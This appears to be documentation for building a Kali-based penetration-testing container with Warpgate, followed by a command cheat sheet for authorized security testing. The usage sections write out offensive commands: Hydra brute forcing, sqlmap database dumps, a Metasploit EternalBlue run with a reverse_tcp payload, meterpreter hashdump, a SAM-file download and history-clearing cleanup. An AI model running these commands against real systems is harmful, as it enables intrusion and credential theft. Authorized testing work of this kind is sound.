# Building and Using Attack Box with Warpgate

Complete guide to building and deploying the Attack Box for offensive security
testing using Warpgate.

## Table of Contents

- [Overview](#overview)
- [Prerequisites](#prerequisites)
- [Quick Start](#quick-start)
- [Building Attack Box Container](#building-attack-box-container)
- [Using Attack Box](#using-attack-box)
  - [Network Scanning](#network-scanning)
  - [Web Application Testing](#web-application-testing)
  - [Password Attacks](#password-attacks)
  - [Exploitation](#exploitation)
- [Common Tools](#common-tools)
- [Troubleshooting](#troubleshooting)
- [Security Considerations](#security-considerations)
- [Cleanup](#cleanup)

## Overview

This guide demonstrates how to build Attack Box images using Warpgate for
penetration testing and security assessments.

**What is Attack Box?**

Attack Box is a comprehensive offensive security testing environment based on
Kali Linux that provides:

- Pre-configured penetration testing tools
- Network reconnaissance and scanning capabilities
- Web application security testing frameworks
- Password cracking and credential harvesting tools
- Exploitation frameworks and post-exploitation tools
- Wireless security testing utilities
- Forensics and reverse engineering tools

**Why use Warpgate for Attack Box?**

- Reproducible builds with version-controlled templates
- Multi-architecture support (amd64, arm64)
- Consistent environment across teams
- Easy deployment to container orchestration platforms
- Integration with CI/CD pipelines for security testing

## Prerequisites

**Required:**

- Docker or Podman installed and running
- Warpgate installed ([installation guide](../README.md#installation))
- Provisioning repository with Attack Box playbooks
- Basic understanding of penetration testing methodologies
- **CRITICAL: Written authorization for security testing**

**For production use:**

- Proper authorization documentation
- Isolated network environment
- Understanding of legal and ethical boundaries
- Appropriate logging and monitoring

## Quick Start

Get Attack Box running in 5 minutes:

```bash
# Build Attack Box container image
warpgate build attack-box --arch amd64

# Run Attack Box container
docker run -it --rm \
  --name attack-box \
  attack-box:latest \
  /bin/bash

# Inside container, verify tools
nmap --version
metasploit-framework-console --version
burpsuite --version
```

## Building Attack Box Container

### Using Warpgate Template

**Build from template name:**

```bash
# Build for amd64
warpgate build attack-box --arch amd64

# Build for arm64
warpgate build attack-box --arch arm64

# Build for both architectures
warpgate build attack-box --arch amd64,arm64
```

**Verify the build:**

```bash
# Check image was created
docker images | grep attack-box

# Expected output:
# attack-box    latest    abc123def456    5 minutes ago    3.5GB
```

### Building with Custom Provision Path

If your template requires an Ansible collection:

```bash
# Build with variable override
warpgate build attack-box --var PROVISION_REPO_PATH=/path/to/ansible-collection-arsenal

# Or use a variable file
cat > attack-box-vars.yaml <<EOF
PROVISION_REPO_PATH: /path/to/ansible-collection-arsenal
VERSION: 1.0.0
DEBUG: true
EOF

warpgate build attack-box --var-file attack-box-vars.yaml
```

## Using Attack Box

### Network Scanning

**Basic host discovery:**

```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# Quick port scan
nmap -F 192.168.1.100

# Full port scan
nmap -p- 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100
```

**Advanced scanning:**

```bash
# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# TCP SYN scan (stealthy)
nmap -sS 192.168.1.100

# UDP scan
nmap -sU 192.168.1.100

# Save results
nmap -oA scan_results 192.168.1.0/24
```

### Web Application Testing

**Manual testing with Burp Suite:**

```bash
# Start Burp Suite
burpsuite &

# Configure browser proxy to 127.0.0.1:8080
# Intercept and modify HTTP requests
```

**Automated scanning with Nikto:**

```bash
# Basic web scan
nikto -h http://target.com

# Scan with SSL
nikto -h https://target.com

# Scan specific port
nikto -h http://target.com -p 8080

# Save results
nikto -h http://target.com -o nikto_results.txt
```

**Directory brute forcing:**

```bash
# Using dirb
dirb http://target.com /usr/share/wordlists/dirb/common.txt

# Using gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Custom extensions
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

**SQL injection testing:**

```bash
# Using sqlmap
sqlmap -u "http://target.com/page?id=1" --dbs

# Dump specific database
sqlmap -u "http://target.com/page?id=1" -D database_name --dump

# Test POST parameters
sqlmap -u "http://target.com/login" --data="username=admin&password=pass" --dbs
```

### Password Attacks

**Hash cracking with John the Ripper:**

```bash
# Crack password hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Brute force with rules
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Hydra for online attacks:**

```bash
# SSH brute force
hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100
```

### Exploitation

**Metasploit Framework:**

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search windows smb

# Use specific exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set LHOST
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Run exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

**Basic Meterpreter commands:**

```bash
# System information
meterpreter > sysinfo

# Get user ID
meterpreter > getuid

# List processes
meterpreter > ps

# Migrate to process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Screenshot
meterpreter > screenshot

# Download file
meterpreter > download c:\\windows\\system32\\config\\sam

# Upload file
meterpreter > upload /root/payload.exe c:\\temp\\payload.exe
```

## Common Tools

### Reconnaissance Tools

- **nmap** - Network scanner
- **masscan** - Fast port scanner
- **recon-ng** - Web reconnaissance framework
- **theHarvester** - OSINT gathering tool
- **whois** - Domain information lookup
- **dnsenum** - DNS enumeration
- **fierce** - DNS reconnaissance

### Web Application Tools

- **Burp Suite** - Web proxy and testing suite
- **OWASP ZAP** - Web application scanner
- **nikto** - Web server scanner
- **sqlmap** - SQL injection tool
- **wpscan** - WordPress vulnerability scanner
- **gobuster** - Directory/file brute forcer
- **ffuf** - Fast web fuzzer

### Password Tools

- **John the Ripper** - Password cracker
- **Hashcat** - Advanced password recovery
- **Hydra** - Network login cracker
- **Medusa** - Parallel login brute forcer
- **CeWL** - Custom wordlist generator
- **crunch** - Wordlist generator

### Exploitation Tools

- **Metasploit Framework** - Exploitation framework
- **SearchSploit** - Exploit database search
- **Empire** - Post-exploitation framework
- **BeEF** - Browser exploitation framework

### Wireless Tools

- **aircrack-ng** - WiFi security testing suite
- **Reaver** - WPS attack tool
- **Wifite** - Automated wireless attack tool
- **kismet** - Wireless network detector

## Troubleshooting

### Tool Not Found

**Symptoms:**

Command not found errors for specific tools.

**Solutions:**

```bash
# Update package lists
apt-get update

# Install missing tool (example: nmap)
apt-get install -y nmap

# Search for tool package
apt-cache search <tool-name>
```

### Network Access Issues

**Symptoms:**

Cannot reach target networks from container.

**Solutions:**

```bash
# Run container with host network
docker run -it --rm --network host attack-box:latest /bin/bash

# Or use specific network
docker run -it --rm --network custom-network attack-box:latest /bin/bash

# Verify network connectivity
ping 8.8.8.8
traceroute 192.168.1.1
```

### Permission Denied Errors

**Symptoms:**

Tools fail with permission errors.

**Solutions:**

```bash
# Ensure running as root
whoami  # Should show 'root'

# Run container with additional capabilities
docker run -it --rm --privileged attack-box:latest /bin/bash

# Or add specific capabilities
docker run -it --rm --cap-add=NET_ADMIN --cap-add=NET_RAW attack-box:latest /bin/bash
```

### Display/GUI Issues

**Symptoms:**

Cannot launch GUI tools like Burp Suite.

**Solutions:**

```bash
# Enable X11 forwarding
xhost +local:docker

# Run container with display
docker run -it --rm \
  -e DISPLAY=$DISPLAY \
  -v /tmp/.X11-unix:/tmp/.X11-unix \
  attack-box:latest /bin/bash

# Inside container, test GUI
xeyes  # Should display GUI window
burpsuite &
```

## Security Considerations

### Legal and Ethical Use

**CRITICAL: This tool is for authorized security testing only.**

**Before using Attack Box:**

- ✅ Obtain written authorization for security testing
- ✅ Understand applicable laws in your jurisdiction
- ✅ Follow responsible disclosure practices
- ✅ Document all testing activities
- ✅ Use in isolated, controlled environments

**Never:**

- ❌ Test against systems you don't own or have permission to test
- ❌ Deploy in production environments without authorization
- ❌ Use tools for malicious purposes
- ❌ Leave tools running after testing completes
- ❌ Share credentials or sensitive data discovered during testing

### Network Isolation

**Container deployment:**

```bash
# Use isolated network
docker network create pentest-network
docker run -it --rm --network pentest-network attack-box:latest

# Limit network access
docker run -it --rm --network none attack-box:latest  # No network
```

### Activity Logging

**Enable comprehensive logging:**

```bash
# Log all commands
script attack-box-session-$(date +%Y%m%d-%H%M%S).log

# Use inside container for complete audit trail
```

### Cleanup After Testing

**Always clean up after security testing:**

1. Remove uploaded files and tools
2. Delete created user accounts
3. Clear command history
4. Document findings
5. Remove container artifacts

## Cleanup

### Remove Tool Artifacts

**Clean up after tool usage:**

```bash
# Remove Metasploit logs
rm -rf ~/.msf4/logs/*

# Clear command history
history -c
rm -f ~/.bash_history

# Remove temporary files
rm -rf /tmp/*
rm -rf /var/tmp/*
```

### Container Cleanup

**Stop and remove Docker container:**

```bash
# Stop container
docker stop attack-box

# Remove container
docker rm attack-box

# Optional: Remove image
docker rmi attack-box:latest
```

**Clean up Docker resources:**

```bash
# Remove stopped containers
docker container prune -f

# Remove unused networks
docker network prune -f

# Remove unused volumes
docker volume prune -f
```

## Summary

**Key Takeaways:**

- Attack Box provides comprehensive penetration testing capabilities
- Based on Kali Linux with pre-configured security tools
- Warpgate simplifies deployment with reproducible builds
- Support for multiple architectures (amd64, arm64)
- **Always obtain authorization before security testing**
- Follow responsible disclosure practices
- Document all testing activities thoroughly

**Quick Command Reference:**

```bash
# Build Attack Box
warpgate build attack-box --arch amd64

# Run container
docker run -it --rm attack-box:latest /bin/bash

# Common tools
nmap -A target.com
nikto -h http://target.com
hydra -l admin -P wordlist.txt ssh://target.com
msfconsole

# With GUI support
docker run -it --rm \
  -e DISPLAY=$DISPLAY \
  -v /tmp/.X11-unix:/tmp/.X11-unix \
  attack-box:latest /bin/bash
```

For more information about Kali Linux and penetration testing, visit the
[Kali Linux documentation](https://www.kali.org/docs/).
